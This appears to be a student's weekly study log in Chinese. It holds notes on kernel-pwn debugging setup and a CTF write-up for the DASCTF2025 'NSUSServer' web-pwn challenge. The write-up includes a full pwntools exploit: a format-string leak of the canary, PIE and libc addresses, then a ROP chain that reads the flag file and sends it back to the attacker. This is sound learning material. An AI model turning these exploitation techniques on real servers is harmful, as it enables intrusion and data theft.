## 完成事项

期末考...

## 未完成事项及原因

## 下周待做事项

## 本周学习的知识

##### kernel小总结

大概还是不会有关于题目的内容...主要就是一些基本的操作

###### 1:解包cpio

~~右键解压~~(其实也不是不行)

```sh
mkdir rootfs;
cpio -D rootfs -idm < ./rootfs.cpio;
```

###### 2:打包cpio

```sh
find . | cpio -o --format=newc > ../rootfs.cpio;
```

###### 3:查看内核版本

```sh
file bzImage 
```

或

```sh
strings ./bzImage |grep gcc
```

###### 4:查看内核text段地址

```sh
#(在qemu内输入)
cat /proc/kallsyms |grep _text
#查看模块地址
lsmod
#这个是网上看到的,查看模块地址.需要root
```

###### 5:修改root权限

```sh
#(在解包出来的cpio内找到init或者类似的sh脚本)
#将 setsid cttyhack setuidgid 1000 sh 改为:
setsid cttyhack setuidgid 0 sh
```

###### 6:gdb调试

```sh
#(修改start.sh)
#在最后添加 -s
#如:
#!/bin/bash

qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -s
```

```sh
gdb
$ file vmlinux
$ add-symbol-file easy.ko
$ target remote localhost:1234
```

```sh
#或者直接写个脚本
GDB_PATH=gdb



KO_FILE=./hackme.ko

VMLINUX_FILE=../vmlinux

REMOTE_TARGET=:1234



$GDB_PATH -ex "add-symbol-file $KO_FILE 0xffffffffc0000000" \

          -ex "file $VMLINUX_FILE" \

          -ex "target remote $REMOTE_TARGET" \

          -ex "c"

```

###### 7:得到elf版本的内核:

```sh
#用的是vmlinuxtoelf
vmlinux-to-elf file1 file2
```

###### 8:内核函数对应的系统调用:

为什么我想(间接的)调用内核模块的函数,只需要open()然后对着文件描述符去read();write();就行了?

因为ELF文件里就是这么定义的:

```assembly
.rodata:0000000000000320 ; Segment type: Pure data
.rodata:0000000000000320 ; Segment permissions: Read
.rodata:0000000000000320 _rodata         segment align_32 public 'CONST' use64
.rodata:0000000000000320                 assume cs:_rodata
.rodata:0000000000000320                 ;org 320h
.rodata:0000000000000320 ; const file_operations hackme_fops
.rodata:0000000000000320 hackme_fops     dq offset __this_module ; owner
.rodata:0000000000000320                                         ; DATA XREF: .data:hackme_misc↓o
.rodata:0000000000000328                 dq 0                    ; llseek
.rodata:0000000000000330                 dq offset hackme_read   ; read
.rodata:0000000000000338                 dq offset hackme_write  ; write
.rodata:0000000000000340                 dq 0                    ; read_iter
.rodata:0000000000000348                 dq 0                    ; write_iter
.rodata:0000000000000350                 dq 0                    ; iopoll
.rodata:0000000000000358                 dq 0                    ; iterate
.rodata:0000000000000360                 dq 0                    ; iterate_shared
.rodata:0000000000000368                 dq 0                    ; poll
.rodata:0000000000000370                 dq 0                    ; unlocked_ioctl
.rodata:0000000000000378                 dq 0                    ; compat_ioctl
.rodata:0000000000000380                 dq 0                    ; mmap
.rodata:0000000000000388                 dq 0                    ; mmap_supported_flags
.rodata:0000000000000390                 dq offset hackme_open   ; open
.rodata:0000000000000398                 dq 0                    ; flush
.rodata:00000000000003A0                 dq offset hackme_release; release
.rodata:00000000000003A8                 dq 0                    ; fsync
.rodata:00000000000003B0                 dq 0                    ; fasync
.rodata:00000000000003B8                 dq 0                    ; lock
.rodata:00000000000003C0                 dq 0                    ; sendpage
.rodata:00000000000003C8                 dq 0                    ; get_unmapped_area
.rodata:00000000000003D0                 dq 0                    ; check_flags
.rodata:00000000000003D8                 dq 0                    ; flock
.rodata:00000000000003E0                 dq 0                    ; splice_write
.rodata:00000000000003E8                 dq 0                    ; splice_read
.rodata:00000000000003F0                 dq 0                    ; setlease
.rodata:00000000000003F8                 dq 0                    ; fallocate
.rodata:0000000000000400                 dq 0                    ; show_fdinfo
.rodata:0000000000000408                 dq 0                    ; copy_file_range
.rodata:0000000000000410                 dq 0                    ; remap_file_range
.rodata:0000000000000418                 dq 0                    ; fadvise
.rodata:0000000000000418 _rodata         ends
.rodata:0000000000000418
```

(我知道这不是个很好的解释,但我的目的主要是建立一套能让我自己觉得逻辑大体自洽的知识体系.至于更深层的原理就暂且搁置吧)

简单的说,如果模块需要实现"字符设备驱动",那么它就可能要有这么个结构体来替换一部分syscall操作.

这个结构体会在模块初始化的时候被使用:

```c
int __cdecl hackme_init()
{
  _fentry__();
  return misc_register(&hackme_misc);
}

```

```sh
.data:0000000000000440 hackme_misc     dd 0FFh                 ; minor
.data:0000000000000440                                         ; DATA XREF: hackme_init+6↑o
.data:0000000000000440                                         ; hackme_exit+1↑o
.data:0000000000000444                 db 4 dup(0)
.data:0000000000000448                 dq offset aHackme       ; name ; "hackme"
.data:0000000000000450                 dq offset hackme_fops   ; fops
.data:0000000000000458                 dq 0                    ; list.next
.data:0000000000000460                 dq 0                    ; list.prev
.data:0000000000000468                 dq 0                    ; parent
.data:0000000000000470                 dq 0                    ; this_device
.data:0000000000000478                 dq 0                    ; groups
.data:0000000000000480                 dq 0                    ; nodename
.data:0000000000000488                 dw 0                    ; mode
.data:000000000000048A                 db 6 dup(0)
.data:000000000000048A _data           ends
.data:000000000000048A
```

因此,我们就可以通过系统调用的方式,间接的调用到这些内核函数.

#### [DASCTF2025 上半年赛]NSUSServer

webpwn,主程序提供了一个访问当前目录下文件的服务,同时过滤了文件名中的flag

漏洞点在其中一个错误处理函数,是snprintf的格式化字符串漏洞:

```c
unsigned __int64 __fastcall file_does_not_exist(int a1, const char *a2)
{
  size_t v2; // rbx
  size_t v3; // rax
  size_t v4; // rax
  char s[1288]; // [rsp+10h] [rbp-520h] BYREF
  unsigned __int64 v7; // [rsp+518h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  snprintf(
    s,
    0x500uLL,
    "HTTP/1.1 404 Not Found\r\n"
    "server: NsusServer :>\r\n"
    "stribik: Ciallo\r\n"
    "Content-Type: text/html\r\n"
    "\r\n"
    "<!DOCTYPE html><html><head><title>404 Not Found</title><meta charset=\"UTF-8\"></head><body><div align='center'>file"
    " does not exist:");
  v2 = 1258 - strlen(s);
  v3 = strlen(s);
  snprintf(&s[v3], v2, a2); //将用户可以控制的a2作为了格式化字符串,正确写法应该是"%s",a2);这样
  strcpy(&s[strlen(s)], "</div></body></html>");
  v4 = strlen(s);
  send(a1, s, v4, 0);
  return v7 - __readfsqword(0x28u);
}
```

可以泄露出各种地址(栈,PIE,libc等)

另外,通过ldd可以发现,题目提供的附件缺失了一个.so文件,而这个文件和题目程序位于同一目录下:

```sh
$ ldd ./attachment 
	linux-vdso.so.1 (0x00007ffe56d94000)
	./a.so (0x00007f18e311a000)
	libstdc++.so.6 => /usr/lib/x86_64-linux-gnu/libstdc++.so.6 (0x00007f18e2ede000)
	libgcc_s.so.1 => /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f18e2ebe000)
	./libc.so.6 (0x00007f18e2c95000)
	libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f18e2bae000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f18e312d000)

```

那么对线上程序发送请求,将a.so下载下来:

```python
from pwn import *

r=remote("node5.buuoj.cn",27737)

pay=b"GET /a.so"
r.send(pay)
r.recvuntil("\r\n\r\n")
#一开始打的时候把ELF头最前面的那个7f字节给截掉了...我还在想为什么读不出来.
f=open("a.so","wb")

while True:
    stri=r.recv(0x1000)
    if stri=="":
        break
    f.write(stri)

```

然后就能找到一个溢出:

```c
unsigned __int64 __fastcall afunc(int a1, char *a2)
{
  size_t v2; // rbx
  const void *v3; // rax
  char v5; // [rsp+13h] [rbp-8Dh] BYREF
  int i; // [rsp+14h] [rbp-8Ch]
  char *v7; // [rsp+18h] [rbp-88h]
  char v8[104]; // [rsp+20h] [rbp-80h] BYREF
  unsigned __int64 v9; // [rsp+88h] [rbp-18h]

  v9 = __readfsqword(0x28u);
  v7 = strstr(a2, "input=");
  if ( v7 )
  {
    v7 += 6;
    for ( i = 0; i <= 511; ++i )
      v8[i + 32] = v7[i];
    send(a1, "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 13\r\n\r\nHello, World!", 0x56uLL, 0);
  }
  else
  {
    std::allocator<char>::allocator(&v5);
    std::string::basic_string<std::allocator<char>>(v8, "HTTP/1.1 400 Bad Request\r\n\r\nMissing input parameter.", &v5);
    std::allocator<char>::~allocator(&v5);
    v2 = std::string::length(v8);
    v3 = (const void *)std::string::c_str(v8);
    send(a1, v3, v2, 0);
    std::string::~string(v8);
  }
  return v9 - __readfsqword(0x28u);
}
```

之后在这里试了两种方法,但都没打通.我的方法和官方wp的区别只在我用了bss段作为缓冲,估计是线上环境和本地的差别导致的(比如线上泄露的地址和本地不同).后面改成栈上缓冲就都能打通了.

```python
from pwn import *
#host=process("./attachment")
#gdb.attach(host)
#r=remote("127.0.0.1",9999)


ip="node5.buuoj.cn"
port=25142

"""
ip="127.0.0.1"
port=9999

host=process("./attachment")
host.recvuntil(b"already listen at 9999")
"""

r=remote(ip,port)
#pause()
pay0=b"GET /%167$p_%170$p_%171$p_%197$p HTTP/1.1\n"

r.send(pay0)
#8B6E5
r.recvuntil(b"file does not exist:./")
canary=int(r.recvuntil(b"_")[:-1],16)
stack_add=int(r.recvuntil(b"_")[:-1],16)
pie_base=int(r.recvuntil(b"_")[:-1],16)-0x354d
libc_base=int(r.recvuntil(b"</div>")[:-6],16)-0x8B665
print(hex(canary),hex(stack_add),hex(pie_base),hex(libc_base))
r.close()

libc=ELF("./libc.so.6")
libc.address=libc_base
rdi_add=0x2a3e5+libc_base
rsi_add=0x2be51+libc_base
rdxr12_add=0x11f2e7+libc_base
rax2rdi_add=0x5a171+libc_base
flag_add=0x43AB+pie_base
bss_add=0xa800+pie_base
filename_add=0x44A3+pie_base
main_add=0x379E+pie_base
start_add=0x2780+pie_base
syscall_add=0x29db+libc_base
xorr10_add=0x1498f8+libc_base
rcx_add=0x3d1ee+libc_base
ret_add=0x116273+libc_base
sendfile_add=0x2BA3+pie_base
#把flag写到另一个文件里的rop:
"""
flag_add=stack_add-0x260
rop=p64(rdi_add)+p64(flag_add)+p64(rsi_add)+p64(0)+p64(rdxr12_add)+p64(0)+p64(0)+p64(libc.sym["open"])+p64(rdi_add)+p64(5)+p64(rsi_add)+p64(stack_add-0x200)+p64(rdxr12_add)+p64(50)+p64(0)+p64(libc.sym["read"])+p64(rdi_add)+p64(stack_add-0x258)+p64(rsi_add)+p64(65)+p64(rdxr12_add)+p64(0x1ff)+p64(0)+p64(libc.sym["open"])+p64(rdi_add)+p64(6)+p64(rsi_add)+p64(stack_add-0x200)+p64(rdxr12_add)+p64(50)+p64(0)+p64(libc.sym["write"])

r=remote(ip,port)
pay1=b"GET /a.cgi?input="+b"flag\x00\x00\x00\x00FLAG\x00".ljust(72,b"a")+p64(canary)+b'a'*0x18+rop+b" HTTP/1.1\n"
r.send(pay1)
r.close()

pause()
r=remote(ip,port)
#context.log_level='debug'
r.send(b"GET /FLAG HTTP/1.1\n")
r.interactive()
"""

#"""
#用sendfile把flag发回来的rop
flag_add=stack_add-0x260
rop=p64(rdi_add)+p64(flag_add)+p64(rsi_add)+p64(0)+p64(rdxr12_add)+p64(0)+p64(0)+p64(libc.sym["open"])+p64(rdi_add)+p64(5)+p64(rsi_add)+p64(stack_add-0x200)+p64(rdxr12_add)+p64(50)+p64(0)+p64(libc.sym["read"])+p64(rdi_add)+p64(4)+p64(rsi_add)+p64(stack_add-0x200)+p64(rdxr12_add)+p64(50)+p64(0)+p64(rcx_add)+p64(0)+p64(libc.sym["send"])
pay1=b"GET /a.cgi?input="+b"flag\x00".ljust(72,b"a")+p64(canary)+b'a'*0x18+rop+b" HTTP/1.1\n"
r=remote(ip,port)
r.send(pay1)
r.interactive()
#"""

```

## 本周自己学习过程中遇到的问题和疑问点

## 情感、思考、观点

最近状态不太好...总之现在终于放假了,可以试图调整一下.

## 在团队的感触和建议
